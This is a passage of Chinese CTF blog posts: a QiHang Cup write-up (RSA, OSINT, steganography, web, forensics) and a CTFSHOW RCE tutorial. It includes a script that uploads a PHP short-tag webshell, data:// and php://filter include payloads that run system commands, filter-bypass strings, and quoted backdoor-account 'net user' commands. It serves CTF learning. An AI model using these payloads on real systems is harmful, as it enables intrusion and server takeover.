[{"title":"启航杯WP","url":"/2025/01/25/启航杯WP/","content":"\n这次启航杯跟Demon师傅组队，Demon师傅很牛做出两个misc但是web的发力期被我截断了不然肯定嘎嘎做，但是必须批评Demon找来的两个队友水的一逼而且态度真是无语，早早组好的局竟然有个人没报名，然后一整天都在当捧哏，一个ez的伪协议绕过就直接把他卡死一早上。下午我让他去写WP payload和思路都给了结果晚上了给我说：”写不出来~“另一个选手也是极品，报名了但是好像没参与，给一号选手用账号去了。最后定榜55名，我以为是没奖但是好像是前70给奖，但是无所谓了，题的质量很一般。可惜misc还是做少了经验太少不然感觉除了第二个osint以外其他的应该是能ak的，\n\n取证也是奇奇怪怪的FTK配了半天挂载到本地结果还是不好使一直权限不够权限不够的，不然感觉还能多做点取证题。\n\n幸亏有Demon师傅帮我分担写wp的重担，而且还给我投喂奶茶和点心真是破费了。\n\n## Crypto\n\n### Easy_RSA\n\n题目是开启容器给题，基本上就是动态flag\n\n![ezrsa1.png](https://Liang-WW.github.io/images/202501/启航杯/ezrsa1.png)\n$$\nprivate_key = b'-----BEGIN RSA PRIVATE KEY-----\\nMIICWwIBAAKBgQDaRITFDVDfEl8XwGzeiYnK+ZL9tB16amRkn+1je4M7lONcmQEV\\nL673B9YpCZ1HVtD87G7xiHmc/wrgi8bzEVQ06YRLXThg6IoTbT6LUZPYZn8SevBN\\npc46oD8VPfMmplc0DXqg/HJaQYj4HhSTjontsO2ohGExUndlcpQrcDwQBQIDAQAB\\nAoGANF40LMMhICRcRGqatFnzgYuXxN8uI2zbYXktj6zWs7jpRBJBvD+QjxyGOZpg\\n7fjac5SWmcTQyOY4Sd+/gBosRYRA11O+ssWUvYva1pxAW36QYn6BApuuFOJV4iZN\\n7z5lyHdQU9AKW+qfCw5mYBqDu/gQ6aIKIqXcc4yzOuVWfZECQQDpO7X+cDDRUKMS\\nsrT5BUCgLKeZ+EvcItAMFDPctYWx3M4TWs7rx/4mKRLUb4M+kAeMjNRr/uHP1WbO\\nethUI/0HAkEA75LUucqfHxy70m6fM4TDbMd9+l/9rHur9LNOVATyOTtP8o6cEmNw\\n7jIm1+qCdY4UUV04E6JAJCdHfs2XvZPTkwJAARmD+SgkQshjjHIFQmtQ67BqNeKi\\n0O3lFzl9KRw9/iGxYwv5j8kInLty2EeSUdgyAOqlEcFI5Ub3Th/sJzFoPwJAWcBA\\nQXpPMnCpTKR0r/BE5jO2Vl4vwrZyLTIfXgqcVCSMRup2Pc1TOWlAdBM+3JtlsTWj\\nFHfsX573geGzvynqUQJAGVEl858Q0cjbagyTh5ByLxn+dR+Zsixjw7xBX1isJW2+\\n2iiEUVsixyYY3/Yk7/m+B/FF5iTV5G7pNK1oQ35fAA==\\n-----END RSA PRIVATE KEY-----'\npublic_key = b'-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDaRITFDVDfEl8XwGzeiYnK+ZL9\\ntB16amRkn+1je4M7lONcmQEVL673B9YpCZ1HVtD87G7xiHmc/wrgi8bzEVQ06YRL\\nXThg6IoTbT6LUZPYZn8SevBNpc46oD8VPfMmplc0DXqg/HJaQYj4HhSTjontsO2o\\nhGExUndlcpQrcDwQBQIDAQAB\\n-----END PUBLIC KEY-----'\nenmessage:WjCP8Htx9flF7S28xJz/eiwjOJr5QwJ9ZUTLL3PqujMsAWonjLeMLfcHprEY/lcyXOR3CShyE0HqQjEFnRrI0+cnwtFkY3OG341g6mEuwqG364vKmq95FPEi76y9ICdfuagTdAuzhzvISXkgATQ2V31nvgeln1+vuAq0hez9qEM=\nprivate_key = b'-----BEGIN RSA PRIVATE KEY-----\\nMIICXAIBAAKBgQDSkyfKFrEABN38FH5ZWwclPY+7z3I5qp8ckUcp0MDM9AEw9C4U\\n2TpQ6kX7o1DhxaX+lXZsvkY30VTjeFLagQLwyEvEaXkLrCkA6Vt+LRZrGh/eoji2\\nmwZgZQAP5mcNN+zd8UfJ477WiSnyFAhP9xo4Yk/ulBiiXbDzxJ6uENavhwIDAQAB\\nAoGAIlmyBHPrf3V2dtrVpPhF8/ZqaONAHsBtaz4XDe8JUdsTX1Z94UBxvxBbG9+6\\nNSebr/+BYt+D2d19NmGC9opUHaz0ngSTSAbLhJRKLfl/i2aI1I6A/Gj88zi8s6yF\\nsQr8jgLZMg1xYDtjXRRcMRB16fPXecikJBfUuhHocWEtyokCQQDY6o31ZF8mM2rl\\nz1QrOHs5oIAXGgWsrrPQS9dlFsp3b5xo4l7vwgZfl8bSCujfnM4v/KJfJt/TJu9E\\nWlTv8mupAkEA+IQZKsutRpb+zRKd+/jKZV3xXuo+eJGT8rydp5L1xy0Aen+qKZyd\\naTl2dUFUo04/bmxGKmsD/VPPjskpDOy/rwJBAI+7jGlIIwxLEdBJe3pQKMbcpUOp\\niI0ODjQ9rPJdEbfmivus1D+Gj3aUObhAZmKVosKFYoouVi2yJOVj/dgpCFECQF2o\\nkz+QsUYIRBEPciDzO3wGcqAd0dtoqgRyV0w/U4d0C1kfYgb6skxkzqMUMwy0wa0g\\n+zSjTkab3n5mi6UGWJsCQApqGz86U709A3G9gF34G75ePLQVwOI/9RjtzxuIY3Rn\\nBS5ACOsQb/kW1wal2MhCOdWKgDrl0KZpzg855Sh4Rd0=\\n-----END RSA PRIVATE KEY-----'\npublic_key = b'-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDSkyfKFrEABN38FH5ZWwclPY+7\\nz3I5qp8ckUcp0MDM9AEw9C4U2TpQ6kX7o1DhxaX+lXZsvkY30VTjeFLagQLwyEvE\\naXkLrCkA6Vt+LRZrGh/eoji2mwZgZQAP5mcNN+zd8UfJ477WiSnyFAhP9xo4Yk/u\\nlBiiXbDzxJ6uENavhwIDAQAB\\n-----END PUBLIC KEY-----'\nenmessage:OVafA/n9ovZx9rd+mM2lz41u4Ga1xaYJssXApL0hfKwBWTA/XAC+OX4hVk3UWPZbs/68oN/C5LmzwEfyBC0N10cOIuJq78eTvMLaj6tc72PPAbt+0YUBSbIMt6m7/kzty/l5nbZxVt4TCPyH8Zqr4NzriqQhNwjUhrhTGT7wJBs=\n$$\n其实我是不太会密码的然后附件给了一个py的模板\n\n```python\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import padding\nfrom cryptography.hazmat.primitives import hashes\nimport base64\n\n# 加载私钥\n\nprivate_key_pem = b\"\"\"\n-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQC8NruXkH2ORXb249GMv+8Y3tPd8nu5OOMPUV5L16KELi9AVxoY\nY1v7aEnMXNkUEQ1yeLjyxQrPV3QmQA9jaTLdLf/QgyxGPDlVjjb1g9uxxLr5N0a4\nSLZ9uaQ5EkswTFtvQyHzbC21eowxvVNapHMfEEp5YuThrgQynxuQCcHtswIDAQAB\nAoGAFUNKV8SV5/lBXSypSJvfBfHCgLFQuJZMfIyw46OQSMYzm11butlFaSEZLpJn\nXxolaUMUgy9Z2ckOUPXtZx8u2iv2t1UzJeh3cCbhGok4+Ja69JWoRQeslTk2W2Tx\nTYuUuspQYYrna+cUNsd4MRKMoa+bDosjRy3rqlnvPb5utC0CQQDSvDxlWjvI+pFf\n4fylByLBSlfDDDR80tXoMWj28t43JH+mviyl8rkX7zppH4BVe9IL+0nv+myWuJ8O\nIcQ4SZKHAkEA5KQZxRGMd1Ax1HhFqOPzqMFcszzzp2mpOEbZyhmrCRAa5MUmPIko\nrwYJvYwUWT7a3AZcl/Koi7bqhfFOo43adQJAS76k5rkcLA0EG7aanKaH83nJOa41\nX3hYsnCwDbMV9DQGPeS1H6Cyrsup7wcHlbI/uVbFKKCWT0ZkxSuV37VyGQJBANB2\nUkycgG60fopTEmg3VgwyKHv/gcPNEY2PA7lBh/DebzbQDdm50I8ruSvKES+BoHhl\nkHy1sTiZkOCIsANtLZUCQQCk1BgGGG+sKRHS2/xu3lT3C2Ihn1hrnNLMQ5QlC0JJ\n/FSHxvVpzB8o94PNq6X+KrK6p82WYfkLKl+A5YPhoh/Q\n-----END RSA PRIVATE KEY-----\n\"\"\"\n\n# 加载私钥\n\nprivate_key = serialization.load_pem_private_key(private_key_pem, password=None)\n\n# 加密的消息\n\nenmessage = b\"PfifIriIHAwst7UxsHPNj3CGwlnNWbB5iVVq9O6oEsinLxxJgHcTmBHFGxWA5FC87aHKARXCzwH+v4H1ES/lMSnkVuVfrQdReR62GYIWUYuB2Gb6LnEJ0n4x9sXBA5FrSH9wlu14WT4S+ko+90kCS2jgGC7R2vKRe2QfFFwZ1R8=\"\n\n# 解密消息\n\nencrypted_message = base64.b64decode(enmessage)\ntry:\n    decrypted_message = private_key.decrypt(\n        encrypted_message,\n        padding.PKCS1v15(),\n\n        # 使用适当的哈希算法\n\n​        algorithm=hashes.SHA256()\n​    )\n​    print(decrypted_message.decode())\nexcept Exception as e:\n​    print(f\"Decryption failed: {e}\")\n\n```\n\n然后去找ai，一开始是直接扔给他是不行的，但是多调教几次就好\n\npayload：\n\n```\n# -*- coding: utf-8 -*-\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\nimport base64\n\n# 加载私钥\nprivate_key = b'''-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDEfgk6+MERVwmKx6b4w4HM+cKlP34Lz7qMICOnDK906zIQyA2a\n7YTba8vssM4jpf+RLda0ZtAWnLj+sVgsBQAaWQ8quUt2FJCFEglpCBbvvsdfBD/A\nWc6w58ekPUWvcMu+Q68EVUre1lSXl8Lt2U0ObB77l577nYAdr7rf7HJMlwIDAQAB\nAoGAAaKQLm7GIdV46DAOckt417J3AtZVv4C/AKN+fclb5xEonX3MqdldcvtL+xri\n3Du+tf/iUCX63UqjOhtSVytuJhuQ2QIUUrkNEPkNBye5aIPN6j4buZXHzyfyVxqy\n6zddT0HTGzIOEn9VIIHMydrrdvEYEd2ZrwlRQApTNAQztGECQQDOllqpJ/R/Kgb3\n8QuJvhN1jDco9DYb9c2+XZL3u5aFZpJ2C86gus2NrK8096V7LOt02Vc0n4gBuXYv\n9BMbo997AkEA832M97qZ+aVi0c0okDv0wORxtDDE/zoXOjzSMS+xMoC7i27Hn/Az\nDL6EHfYBxqj247Tq9QxMBMumclyL/+GOlQJALfwR2i1moxe7zVz+cH663iOD873I\nfZjNX1585GABNViLqXMfX2+1aZ/SsDufvjdVggEPBEuufpPF1w7BYhmsGQJABGJS\nU3OMqi4MJXLoNBCgS4jRc0kdgurs2COYNUKCkkI3Hj+UYJDWmngjsNZpGcaZC2iK\ngncCN2PjT1PTQXwyMQJBAJItDvEaRC8BzlC10h31KC6gmmwU8IsqBYe4B6+btvIT\nUXZ23kO/okQTy65x4MmP5g1XLJAj29jVeZAUW+/B2uo=\n-----END RSA PRIVATE KEY-----'''\n\n# 加密后的消息\nencrypted_message = b'''EfXlCYvGHy4Haw0cl9dW5ufxMoB9rgturZOVoKokBg/fHOPDpiYY+jeABxMKAgjr\nCbtync9Gx0l0dfYSs06KTKVfR5L4oZbwolWx19bCVWzlQ9f91x1Z8U/uE9fG0xna\n/wUTvrExm8QdKC1OxmSFvPNrffrkEDzEVWP3lTPZ3wQ='''\n\ndef decrypt_message(encrypted_message, private_key):\n    # 导入私钥\n    key = RSA.import_key(private_key)\n    # 使用PKCS1_OAEP解密\n    cipher = PKCS1_OAEP.new(key)\n    # 解码Base64格式的加密消息\n    decrypted_message = cipher.decrypt(base64.b64decode(encrypted_message))\n    return decrypted_message.decode()\n\n# 解密消息\ndecrypted_message = decrypt_message(encrypted_message, private_key)\n\n# 输出解密后的消息\nprint(\"解密后的消息:\")\nprint(decrypted_message)\n\n```\n\n![ezrsa2.png](https://Liang-WW.github.io/images/202501/启航杯/ezrsa2.png)\n\n`QHCTF{c0cd580e-2859-469c-b58e-cec1abe77e6d}`\n\n## MISC\n\n### 请找出拍摄地所在位置-OSINT\n\n这个题很恶心，我认为\n\n![请找出拍摄地所在位置.jpg](https://Liang-WW.github.io/images/202501/启航杯/请找出拍摄地所在位置.jpg)\n\n说一下我做这个题目的思路，首先就是对着图片本身去找一下主要就是看exif，但是一般这种网络迷踪肯定是不会给的，所以没有收获很正常，然后我就把目光放到那种精准定位的地方了，我想看左侧蓝色大巴后面小车棚的电话，直接去问问（哈哈真这么想的但是可惜很糊辨认不清楚）然后这些周围的商家店铺太杂乱了，地图上是很难找到的，但是我还是找了想碰碰运气。\n\n接下来的解题思路是锁定右上角的广告，柳城鸿鑫4s店，直接锁死柳州市，然后对着商家店铺输出，最后最容易找到的是绿源电动车上面的那个共享科技美学馆，直接就能锁定这个路口\n\n但是flag死活交不对，一开始我以为是我找错了\n\n*小明在接亲戚回家过年时随手拍了一张照片，之后他在网上发起了一个挑战：找到照片中的地点并排名前三的人，将获得额外奖励。现在，挑战就在你面前，你准备好接受了吗？*\n*提交方式：QHCTF{xx省/自治区xx市xx县/市/区xx路与xx路交叉口}*\n\n看到这个提交格式你不懵逼吗？\n\n最后过了一个多小时我实在做不出来的时候反应过来要不然试试没有/\n\n直接成功，真是无语以后建议给格式就标准一些，别老误导我们CTFer\n\n![osint1.png](https://Liang-WW.github.io/images/202501/启航杯/osint1.png)\n\n`QHCTF{广西壮族自治区柳州市柳城县六广路与榕泉路交叉口}`\n\n### OSINT-你猜猜这是哪？\n\n这道题当时没出，后来在群里问出题人解题思路，出题人说第一个osint是静心拍摄的，第二个osint纯纯随手拍\n\n但是我没想到这题最后20多解，估计是被py烂了，群里的大哥说去大众点评找酒店，不能找后面的银行，银行太多了，酒店反而好找\n\n我是没话说了，能找到感觉也是狗运，我是没狗运了\n\n![你猜猜这是哪？.jpg](http://Liang-WW.github.io/images/202501/启航杯/你猜猜这是哪？.jpg)\n\n### 你能看懂这串未知的文字吗\n\n这题当时也没出，很早就找到羊文了但是扔到随波逐流梭哈没有成功我就很懵逼\n\n![你能看懂这串未知的文字吗.png](https://Liang-WW.github.io/images/202501/启航杯/你能看懂这串未知的文字吗.png)\n\n在贴吧找到羊文对照表\n\n![羊文对照表.png](https://Liang-WW.github.io/images/202501/启航杯/羊文对照表.png)\n\n翻译之后是\n\n```\nszfpguw\nizgwesq\nzoaoerh\n```\n\n但是放到随波逐流里面梭哈没出来，赛后大师傅在群里说是维吉尼亚\n\nlsb隐写\n\nb1,rgb,lsb,xy .. text: \"qihangbeiiseasy\"\n\n然后在用随波逐流维吉尼亚解密就完美解出\n\n`cryptoveryeasybysheeb`\n\n包上{}和flag就行\n\n### PvzHE\n\n这个是植物大战僵尸的那个pvz是Demon做的，进去直接找到images\n\n有一个图片直接就是flag\n\n![ZombieNote1.png](https://Liang-WW.github.io/images/202501/启航杯/ZombieNote1.png)\n\n\n\n### 猿类的编程语言你了解吗\n\n![猿类的编程语言你了解吗.jpg](https:///Liang-WW.github.io/images/202501/启航杯/猿类的编程语言你了解吗.jpg)\n\n用jphs这个工具，但是以前没接触过图片还有这个方向的东西，后来在我的不知道哪个老学长祖传下来的工具包里面就搜到了\n\n但是要密码我不知道在哪，等着官方wp下来之后在看看吧，(根本没秘密我真服了，但是我鼠标点击就报错，回车就行了)导出这个hide之后是ook解密这题比较misc有点好玩\n\n```\nn```\n\nook解密[https://www.splitbrain.org/services/ook](https://www.splitbrain.org/services/ook)直接梭哈了\n\n\n\n### ______启动！\n\n这题是Demon解出的\n\n![启动1.png](https://Liang-WW.github.io/images/202501/启航杯/启动1.png)\n\n找到这个流量包，![启动2.png](https://Liang-WW.github.io/images/202501/启航杯/启动2.png)\n\ntcp追踪流\n\n但是Demon是找的ai直接就吐出来了具体解法没给出\n\n### QHCTF For Year 2025\n\n这个题也是Demon出的根据hint对着日历一个个画出来就能拼出来，不知道为什么这么简单的思路qit那边竟然没人做出来\n\n什么时候qit能来个大爹帮我分担一下压力啊\n\n```\nhint:\n080714212829302316092230-04111825121306132027-0605041118252627-08091009162330-0102031516170108152229-0108142229-0203041617180209162330-0108152229303124171003-231609021725181104-01020917233029\n```\n\n![日历.png](https://Liang-WW.github.io/images/202501/启航杯/日历.png)\n\n最后拼出来是QHCTF{FUN}这个题没啥意思\n\n\n\n## WEB\n\n### PCREMagic\n\n学弟做出来之后给我说是php短标签绕过，然后他写了脚本给我\n\n源码：\n\n```php\n <?php\nfunction is_php($data){\n     return preg_match('/<\\?php.*?eval.*?\\(.*?\\).*?\\?>/is', $data);\n}\n\nif(empty($_FILES)) {\n    die(show_source(__FILE__));\n}\n\n$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);\n$data = file_get_contents($_FILES['file']['tmp_name']);\nif (is_php($data)) {\n    echo \"bad request\";\n} else {\n    if (!is_dir($user_dir)) {\n        mkdir($user_dir, 0755, true);\n    }\n    $path = $user_dir . '/' . random_int(0, 10) . '.php';\n    move_uploaded_file($_FILES['file']['tmp_name'], $path);\n\n    header(\"Location: $path\", true, 303);\n    exit;\n}\n?> 1\n```\n\n学弟做出来之后给我说是php短标签绕过，然后他写了脚本给我\n\n```python\nimport requests\nurl = 'http://challenge.qihangcup.cn:33842/'\nfile = {'file': ('1.php', '<?=eval($_POST[1]);?>', 'images/png')}\nres = requests.post(url, files=file, allow_redirects=False)\nprint(f\"路径: {url}{res.headers['Location']} ,木马为：1\")\n```\n\n![PCREMagic-PY.png](http://Liang-WW.github.io/images/202501/启航杯/PCREMagic-PY.png)\n\n用蚁剑连接,在根目录下找到flag\n\n![蚁剑.png](https://Liang-WW.github.io/images/202501/启航杯/蚁剑.png)\n\n那么这道题对我来说肯定不是这样就得过且过了\n\n开始复盘：\n\n```php\n <?php\nfunction is_php($data){\n     return preg_match('/<\\?php.*?eval.*?\\(.*?\\).*?\\?>/is', $data);\n}\n//这里是一个函数，data传参里面不允许有“/<\\?php.*?eval.*?\\(.*?\\).*?\\?>//”is这些东西，把<?php ?>标签ban了\n\nif(empty($_FILES)) {\n    die(show_source(__FILE__));\n}\n\n//这段代码的意思是如果$_FILES为空（即没有上传的文件），则执行die(show_source(__FILE__))，这会终止程序执行并输出当前文件的源代码。就是说让你传文件呢！\n\n\n$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);\n$data = file_get_contents($_FILES['file']['tmp_name']);\nif (is_php($data)) {\n    echo \"bad request\";\n} else {\n    if (!is_dir($user_dir)) {\n        mkdir($user_dir, 0755, true);\n    }\n    $path = $user_dir . '/' . random_int(0, 10) . '.php';\n    move_uploaded_file($_FILES['file']['tmp_name'], $path);\n\n    header(\"Location: $path\", true, 303);\n    exit;\n}\n?> \n```\n\n因为把很多东西都ban了 让传文件<?php ?>又不能用，那就用php短标签去写一个小马\n\n#### php短标签\n\n```\n<?php ?>是正和常情况下的标签，用于识别这是个php文件，但php也允许使用短标签<? ?>和<?=  >，可以用于php被过滤的情况下。 <? ?>等价于<?php ?> <?= >等价于<?php echo ?>\n举个例子：\n<?='Hello World'?>    // 输出 \"Hello World\"\n```\n\n细细品味一下学弟的payload\n\n```python\nimport requests\nurl = 'http://challenge.qihangcup.cn:33842/'\nfile = {'file': ('1.php', '<?=eval($_POST[1]);?>', 'images/png')}/*建了一个字典，键为 “file”，值是一个元组。元组中第一个元素是字符串 '1.php'，代表一个文件名；第二个元素是字符串也就是文件内容，images/png应该是定义成png格式方便绕过吧'*/\nres = requests.post(url, files=file, allow_redirects=False)//剩下的就是post传参了\nprint(f\"路径: {url}{res.headers['Location']} ,木马为：1\")//回显蚁剑的连接路径\n```\n\n\n\n### Easy_include\n\n源码：\n\n```php\n<?php \nerror_reporting(0); \n//flag in flag.php \n$file=$_GET['file']; \nif(isset($file)) \n{ \n    if(!preg_match(\"/flag/i\",$file)) \n    { \n        include($file); \n    } \n    else \n    { \n        echo(\"no no no ~ \"); \n    } \n} \nelse \n{ \n    highlight_file(__FILE__); \n} \n\n?> \n```\n\n一个简单的文件包含，用data伪协议读取\n\n?file=data://text/plain,<?=system('tac fl*');?>\n\n### Web_IP\n\n\n\n## Forensic\n\n早上起来启航杯平台关了，等着后续平台重启我再去补上Forensic的复现\n\n中午就开放了服了，本来还想歇会，但是我还是拖了两天哈哈根本不想学习。\n\n给出附件（10G）通过网盘分享的文件：启航杯取证.7z\n链接: https://pan.baidu.com/s/1xZ3bY58Td-OQ6CqyrVpNAw?pwd=23ch 提取码: 23ch\n\n解压密码是90382728-ca22-48e7-8413-61f6438f1b90\n\n关于取证这个题给的是e01文件我只会用ftk进行挂载肯定还有别的方式但是好像要收费\n\n然后由于我把这些乱七八糟的东西基本上都放到D盘里面然后D盘权限只给了可读和可写没有给完全控制导致我一直挂载好也进去不\n\n今天捣鼓的时候突然想着看一眼D盘权限果然解决那就继续看看取证\n\n首先就是[**FTK挂载**](https://blog.csdn.net/qq_32393893/article/details/142825936?fromshare=blogdetail&sharetype=blogdetail&sharerId=142825936&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)，FTK其实就是镜像虚拟仿真用的，FTK挂载到本地你本地就会出现挂载起来的磁盘，在此电脑中就能直接看到然后其实就能够正常访问了应该是这样\n\n![FTK本地挂载.png](http://Liang-WW.github.io/images/202501/启航杯/FTK本地挂载.png)\n\n这个时候可以去虚拟机里面搞去仿真，也可以直接本地做题，在这次取证好像win6很难出解，出题人说是因为win6会被杀毒软件杀掉\n\n#### Win_01\n\n某天，小明正在某网站进行学习。突然，一位蛤客盯上了他，并向他发送了一封钓鱼邮件。由于小明刚接触网络安全，对钓鱼邮件并不熟悉，他不小心下载并点击了邮件中的附件。当他后来学习到钓鱼邮件的相关知识时，已经为时晚矣。于是，他请求你帮助找出蛤客的痕迹。请你针对附件镜像进行一次应急响应，查找以下flag值。压缩包附件的解压密码为：90382728-ca22-48e7-8413-61f6438f1b90。请以QHCTF{xxxxxxxx}的格式提交结果。\n\n1.找出系统中蛤客的ip地址及端口，提交方式请以QHCTF{md5(127.0.0.1:80)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}\n\n\n\n#### Win_02\n\n蛤客在控制小明的系统后，创建了一个最高权限的后门账户，请你找出该账户的用户名及密码，提交方式请以QHCTF{md5(user_password)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}\n\n\n\n这个控制系统后的操作看C3师傅的笔记能知道一般都是在powershell的记录里面G:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\n\n也就是这个路径下有一个文件\n\nnet user HackY$ 123456 /add\nnet user HackY$ /de;\nnet user HackY$ /del\nnet user HackY$ 123456 /add\nnet user HackY$ /del\n\n#### Win_04\n\n4.蛤客在系统数据库中藏了一些东西，请你找出其中的flag值\n提交方式：QHCTF{xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx}\n\n\n\n这个题是在注册表里面找到的flag\n\n#### Win_05\n\n5.小明在找你帮忙之前，喊了他的一位好友帮他先行取证，请你找出他好友远程所使用的软件，并找出控制了多少秒，ip是什么，提交方式请以QHCTF{md5(xxxx_10_127.0.0.1)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}\n\n\n\n\n\n#### Win_06\n\n6.请你找出蛤客在启动项中藏的flag\n 提交方式：QHCTF{xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx}\n\n#### Win_07\n\n蛤客在home目录中存放了一个恶意程序，请你分析该程序，并找到其中的flag值\n提交方式：QHCTF{xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx}\n","tags":["-WP"]},{"title":"命令执行RCE（CTFSHOW）","url":"/2025/01/23/命令执行RCE（CTFSHOW）/","content":"\n# RCE        \n\n RCE（remote code execute）：远程命令执行或者代码执行，我们平时说的rce，比如thinkPHP的rce漏洞，即算代码注入漏洞，也算rce漏洞，因为渗透的最终情况可以实现执行命令或者是代码都属于RCE，例如代码执行、文件包含、反序列化、命令执行，甚至是写文件Getshell都可以属于RCE\n\n关于命令执行，我的认知是web的基础功底，很多别的种类的题目例如ssti这种类型的找到flag时用到的姿势和命令执行很相像思路也是比较接近，所以我们一定由浅入深的把基础的命令执行payload理解透彻\n\n首先就是cat flag（别给我说这个你不会，不会自己查去其实就是个打开的命令，但是在我刚开始进行练习的时候面对的是个tac，一开始我以为是后端写的东西，必须倒叙才行，但是越感觉越不对劲，于是我就去问后来得到个差不多的理解\n\ntac 我的理解是从cat的文件里面倒序出每一行其实就是一种简便的命令\n\nisset() 函数用于检测变量是否已设置并且非 NULL//其实就是保证你正常传参的\n\n本篇文章主要参考落寞的魚师傅的[web命令执行入门](https://blog.csdn.net/Aluxian_/article/details/131024590?fromshare=blogdetail&sharetype=blogdetail&sharerId=131024590&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)\t星|焰师傅的[命令执行详解](https://blog.csdn.net/m0_65409532/article/details/141852711?fromshare=blogdetail&sharetype=blogdetail&sharerId=141852711&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)(但是理论偏多)说多无益多看看题试着做几道就会很舒服了\n\n\n\n\n\n#### web29\n\n```php\n<?php\nerror_reporting(0); \nif(isset($_GET['c'])){ \n    $c = $_GET['c']; \n    if(!preg_match(\"/flag/i\", $c)){ \n        eval($c); \n    } \n     \n}else{ \n    highlight_file(__FILE__); \n}\n```\n\n传参禁止flag字段思路:用通配符*补充好flag.php,然后想办法搞到\n\n`?c=system(\"cp fla* example.txt\");`\n\n积累姿势,这种情况是指的用复制命令把fla*-- *号自动补充后面的内容其实就是指的flag.php\n\n复制了一份新的并命名为example.txt再访问即可\n\n#### web30\n\n```php\n<?php\nerror_reporting(0); \nif(isset($_GET['c'])){ \n    $c = $_GET['c']; \n    if(!preg_match(\"/flag|system|php/i\", $c)){ \n        eval($c); \n    } \n     \n}else{ \n    highlight_file(__FILE__); \n}\n\npayload:?c=echo exec('nl fla?????');//nl是一个文本处理命令，主要用于为文件中的行添加行号\n//payload的意思我是这样翻译的:获取最后一行输出,然后这个命令是nl fla???,就是说fla??的那一行要显示行号然后显示出来内容\nsystem()\npassthru()//也是用于执行外部命令 passthru()函数主要用于执行一些会产生二进制输出的命令\nexec()//它主要是获取命令执行后的最后一行输出。它会将命令的输出放入一个数组（如果提供了第二个参数），并且返回命令的最后一行输出内容。\nshell_exec()//shell_exec()函数执行命令并返回命令的输出结果（作为一个字符串）。它类似于exec()函数，但返回的是完整的输出，而不是最后一行。\npopen()\nproc_open()\npcntl_exec()\n反引号 同shell_exec() \n\n```\n\n\n\n**反引号在php中类似于system函数 可以执行shell命令**\n\n#### web32\n\n```php\n<?php\nerror_reporting(0); \nif(isset($_GET['c'])){ \n    $c = $_GET['c']; \n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){ \n        eval($c); \n    } \n     \n}else{ \n    highlight_file(__FILE__); \n}\n\npayload:php://filter/read=convert.base64-encode/resource=flag.php #伪协议\n\n?c=include_$GET[cmd]?>&cmd=php://filter/read=convert.base64-encode/resource=flag.php\n?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php\ninclude函数:include是 PHP 中的文件包含函数，它的主要作用是将指定的文件内容包含到当前的 PHP 脚本中并执行。这意味着被包含文件中的 PHP 代码将在包含它的脚本的上下文中运行，就好像代码是直接写在包含它的脚本中一样。\n```\n\n这里过滤了反斜杠斜杠分号之类的\n\n思路是用include函数实现不用括号的文件包含,然后再配合伪协议,分号使用>?代替\n\n在这里我对于**include_$GET**这一内容不太理解去问sun师傅,孙师傅告诉我说是实现文件包含重造变量--重造了cmd这个传参然后使得传参不受限制了,**>?**代替了分号\n\n#### web33\n\n\n\n```\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n} \n//过滤了双引号,完全可以照搬32的payload\n\n\n\n?c=include_$GET[lww]?\n>&lww=php://filter/read=convert.base64-encode/resource=flag.php\n?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php\n```\n\n#### web34\n\n```\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\n可以一样用上面的payload\n\n```\n\n#### web35\n\n```\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\npayload;\n?c=include%0a$_GET[cmd]?>&cmd=php://filter/read=convert.base64-encode/resource=flag.php\n\n?c=include$_GET[cmd]?>&cmd=data://text/plan,<?php system(\"tac flag.php\")?>\n\n?c=include$_GET[cmd]?>&cmd=data://text/plan;base64;PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==\n#到这里有三种方法可以使用\n\n```\n\n过滤了，=号和<括号这里可以使用data的base64 把要执行的命令加密了传进去<?php system(\"cat flag.php\");?>\n\n```base\nPD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==\n```\n\n#### web36\n\n```\nerror_reporting(0); \nif(isset($_GET['c'])){ \n    $c = $_GET['c']; \n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\<|\\=|\\/|[0-9]/i\", $c)){ \n        eval($c); \n    } \n     \n}else{ \n    highlight_file(__FILE__); 